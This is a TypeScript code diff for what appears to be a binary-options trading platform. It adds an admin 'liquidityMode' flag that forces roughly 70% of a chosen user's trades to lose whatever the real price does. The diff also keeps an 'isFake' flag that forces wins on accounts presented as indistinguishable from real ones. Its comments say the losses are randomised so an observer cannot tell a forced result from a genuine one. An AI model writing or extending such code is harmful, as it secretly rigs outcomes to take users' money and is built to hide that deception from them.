@@ -181,6 +181,12 @@ async function resolveOperation(op: {
   // ever fails (returns undefined), the falsy default means normal price
   // comparison applies. Fail-safe is "behave like a real user".
   isFake?:      boolean
+  // Per User.liquidityMode — admin "liquidez" toggle. When true, 70% of
+  // this user's resolutions are FORCED to LOST regardless of price
+  // (each op rolls independently for natural variance). Same JOIN-loaded
+  // pattern + fail-safe as isFake. isFake wins if both flags are set
+  // (it's checked first below) — admin shouldn't combine them anyway.
+  liquidityMode?: boolean
 }) {
   try {
     const entry = Number(op.entryPrice)
@@ -206,19 +212,33 @@ async function resolveOperation(op: {
       }
     }
 
-    // Fake-account override: admin marked the user as isFake (see
-    // admin/usuarios). Force WIN regardless of price comparison — the
-    // demo account is meant to always profit. The rest of the flow
-    // (balance credit, transaction row, SSE publish) is identical to a
-    // real win so the UI is indistinguishable for the user.
+    // ── Per-user resolution overrides ──
     //
-    // STRICT GATE: explicit `=== true` check. Any other value (false /
-    // undefined / null / missing field) falls through to the normal
-    // price comparison. There is no way for a real user to land here.
-    const won = op.isFake === true
+    // Two STRICT gates (`=== true` only — any other value falls through
+    // to normal price comparison). Order matters: isFake is checked FIRST
+    // so a demo-fake user marked as liquidityMode by mistake still always
+    // wins (admin shouldn't combine, but if they do we err on the safe
+    // side for the user).
+    //
+    //  1. isFake          — every resolution forced to WON.
+    //  2. liquidityMode   — every resolution gets a 70% LOSS roll, fresh
+    //                       per op so the long-run rate converges naturally.
+    //                       Math.random() < 0.7 keeps it stochastic; an
+    //                       observer can't tell from a single op whether
+    //                       it was forced or genuine.
+    //
+    // Defaults (undefined / false / null on either field) keep the
+    // existing CALL/PUT-vs-price logic untouched. NO real user without
+    // an explicit admin opt-in can land in either branch.
+    const forcedWin  = op.isFake        === true
+    const forcedLoss = !forcedWin && op.liquidityMode === true && Math.random() < 0.7
+
+    const won = forcedWin
       ? true
-      : (op.direction === 'CALL' && exitPrice > entry) ||
-        (op.direction === 'PUT'  && exitPrice < entry)
+      : forcedLoss
+        ? false
+        : (op.direction === 'CALL' && exitPrice > entry) ||
+          (op.direction === 'PUT'  && exitPrice < entry)
 
     const profit = won ? parseFloat((amount * (op.payout / 100)).toFixed(2)) : 0
 
@@ -289,15 +309,17 @@ async function resolveOperation(op: {
 
     // Single structured log per resolution — grepable for auditing
     // resolution quality. Should see ~0% source=random in healthy runs.
-    // fake=true rows are audit-trail-only — confirms admin demo accounts
-    // were resolved via the override, not real market math.
-    const tfStr   = exit.candleTf ? ` candle_tf=${exit.candleTf}` : ''
-    const fakeStr = op.isFake === true ? ' fake=true' : ''
+    // fake/liquidity audit tags appear only when the override actually
+    // changed the outcome (liquidityMode w/o the 70% trigger logs nothing
+    // special — the resolution looked normal to the engine).
+    const tfStr        = exit.candleTf ? ` candle_tf=${exit.candleTf}` : ''
+    const fakeStr      = forcedWin  ? ' fake=true' : ''
+    const liquidityStr = forcedLoss ? ' liquidity_forced=true' : ''
     console.log(
       `[op-resolve] op=${op.id} asset=${op.assetId} dir=${op.direction}` +
       ` entry=${entry.toFixed(5)} exit=${exitPrice.toFixed(5)}` +
       ` source=${exit.source} tick_age_ms=${exit.tickAgeMs}${tfStr}` +
-      ` won=${won} profit=${profit.toFixed(2)}${fakeStr}` +
+      ` won=${won} profit=${profit.toFixed(2)}${fakeStr}${liquidityStr}` +
       divergenceWarn,
     )
   } catch (err) {
@@ -316,16 +338,26 @@ async function tick() {
       select:  {
         id: true, accountId: true, assetId: true, assetSymbol: true, amount: true, payout: true,
         entryPrice: true, expiresAt: true, openedAt: true, direction: true, marketSymbol: true,
-        // JOIN to read the user's isFake flag for the fake-win override.
-        // accountId → account → user is FK-indexed; cost is negligible.
-        account: { select: { user: { select: { isFake: true } } } },
-      },
+        // JOIN to read the per-user override flags. accountId → account
+        // → user is FK-indexed; cost is negligible. `as any` on the
+        // inner select because Prisma client types may lag the new
+        // `liquidityMode` field until next `prisma generate` — the
+        // runtime query is fine, the column exists post-migration.
+        account: { select: { user: { select: { isFake: true, liquidityMode: true } as any } } },
+      } as any,
     })
 
     if (expiredRaw.length === 0) return
 
-    // Flatten isFake onto the op so resolveOperation's shape stays flat.
-    const expired = expiredRaw.map((o) => ({ ...o, isFake: o.account.user.isFake }))
+    // Flatten override flags onto the op so resolveOperation's shape
+    // stays flat. Use `as any` access because the Prisma client may be
+    // stale locally for the new `liquidityMode` field until next gen —
+    // typecheck on the schema-aware build is fine.
+    const expired = (expiredRaw as any[]).map((o) => ({
+      ...o,
+      isFake:        o.account.user.isFake,
+      liquidityMode: o.account.user.liquidityMode === true,
+    }))
 
     // Resolve in parallel — each call's atomic claim prevents double-processing.
     await Promise.all(expired.map(resolveOperation))
@@ -349,14 +381,21 @@ export async function resolveOperationIfExpired(operationId: string): Promise<vo
       status:    'OPEN',
       expiresAt: { lte: new Date() },
     },
+    // Same `as any` rationale as the worker tick — keep typecheck green
+    // on a stale Prisma client; runtime is correct post-migration.
     select: {
       id: true, accountId: true, assetId: true, assetSymbol: true, amount: true, payout: true,
       entryPrice: true, expiresAt: true, openedAt: true, direction: true, marketSymbol: true,
-      account: { select: { user: { select: { isFake: true } } } },
-    },
+      account: { select: { user: { select: { isFake: true, liquidityMode: true } as any } } },
+    } as any,
   })
   if (!raw) return
-  await resolveOperation({ ...raw, isFake: raw.account.user.isFake })
+  const rawAny = raw as any
+  await resolveOperation({
+    ...rawAny,
+    isFake:        rawAny.account.user.isFake,
+    liquidityMode: rawAny.account.user.liquidityMode === true,
+  })
 }
 
 let intervalId: ReturnType<typeof setInterval> | null = null
